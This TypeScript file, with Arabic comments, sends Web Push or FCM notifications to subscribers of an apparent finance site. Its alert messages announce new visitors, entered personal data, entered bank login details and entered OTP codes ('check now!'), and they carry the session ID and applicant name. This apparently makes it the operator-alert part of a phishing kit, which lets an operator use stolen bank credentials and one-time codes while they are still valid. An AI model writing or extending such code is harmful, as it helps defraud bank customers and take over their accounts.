// Push Notifications Service باستخدام Web Push
import webpush from "web-push";

// ─── أنواع الإشعارات ─────────────────────────────────────────────────────
export type NotificationEvent = "visitor" | "personal" | "bank" | "otp";

export interface PushPayload {
  title: string;
  body: string;
  icon?: string;
  badge?: string;
  tag?: string;
  data?: {
    eventType: NotificationEvent;
    sessionId?: string;
    applicantName?: string;
    timestamp: number;
  };
}

// ─── إعدادات VAPID من Environment ───────────────────────────────────────
const vapidPublicKey = process.env.VAPID_PUBLIC_KEY || "";
const vapidPrivateKey = process.env.VAPID_PRIVATE_KEY || "";
const FCM_SERVER_KEY = process.env.FCM_SERVER_KEY || "";

if (vapidPublicKey && vapidPrivateKey) {
  webpush.setVapidDetails(
    "mailto:notifications@jazeera-finance.com",
    vapidPublicKey,
    vapidPrivateKey
  );
  console.log("✅ Push notifications: VAPID keys configured");
} else if (FCM_SERVER_KEY) {
  console.log("✅ Push notifications: FCM Server Key configured");
} else {
  console.log("⚠️ Push notifications: No VAPID or FCM keys configured");
}

// ─── إدارة الاشتراكات ───────────────────────────────────────────────────
const subscriptions = new Map<string, PushSubscription>();

export function saveSubscription(endpoint: string, sub: PushSubscription) {
  subscriptions.set(endpoint, sub);
  console.log(`📱 Push subscription saved: ${subscriptions.size} total`);
}

export function removeSubscription(endpoint: string) {
  subscriptions.delete(endpoint);
  console.log(`📱 Push subscription removed: ${subscriptions.size} remaining`);
}

// ─── رسائل الإشعارات ────────────────────────────────────────────────────
const notificationMessages: Record<NotificationEvent, { title: string; body: string }> = {
  visitor: {
    title: "🆕 زائر جديد!",
    body: "زائر جديد دخل الموقع",
  },
  personal: {
    title: "👤 بيانات جديدة",
    body: "تم إدخال بيانات شخصية جديدة",
  },
  bank: {
    title: "🏦 بيانات بنك!",
    body: "تم إدخال بيانات البنك والدخول",
  },
  otp: {
    title: "🔐 رمز تحقق!",
    body: "تم إدخال رمز التحقق - راجع الآن!",
  },
};

// ─── إرسال إشعار لكل المشتركين ─────────────────────────────────────────
export async function sendPushNotification(eventType: NotificationEvent, extraData?: { sessionId?: string; applicantName?: string }) {
  const message = notificationMessages[eventType];
  
  const payload: PushPayload = {
    title: message.title,
    body: extraData?.applicantName ? `${message.body}: ${extraData.applicantName}` : message.body,
    icon: "/icons/icon-192.png",
    tag: `event-${eventType}`,
    data: {
      eventType,
      sessionId: extraData?.sessionId,
      applicantName: extraData?.applicantName,
      timestamp: Date.now(),
    },
  };

  const payloadStr = JSON.stringify(payload);
  
  // إرسال لجميع الاشتراكات
  const results = await Promise.allSettled(
    Array.from(subscriptions.entries()).map(async ([endpoint, sub]) => {
      try {
        if (FCM_SERVER_KEY && !vapidPublicKey) {
          // استخدام FCM Legacy API
          const response = await fetch("https://fcm.googleapis.com/fcm/send", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              "Authorization": `key=${FCM_SERVER_KEY}`,
            },
            body: JSON.stringify({
              to: sub.endpoint,
              notification: {
                title: payload.title,
                body: payload.body,
                icon: payload.icon,
                tag: payload.tag,
              },
              data: payload.data,
            }),
          });
          if (!response.ok) {
            throw new Error(`FCM error: ${response.status}`);
          }
        } else {
          // استخدام Web Push مع VAPID
          await webpush.sendNotification(sub, payloadStr);
        }
        return { endpoint, success: true };
      } catch (err) {
        console.error(`Push failed for ${endpoint}:`, err);
        // إزالة الاشتراك إذا فشل
        if (err instanceof Error && err.message.includes("410")) {
          subscriptions.delete(endpoint);
        }
        return { endpoint, success: false, error: err };
      }
    })
  );

  const successful = results.filter(r => r.status === "fulfilled" && r.value.success).length;
  const failed = results.filter(r => !r.status || (r.status === "fulfilled" && !r.value.success)).length;
  
  if (successful > 0) {
    console.log(`📱 Push sent: ${successful} success, ${failed} failed`);
  }
  
  return { successful, failed };
}
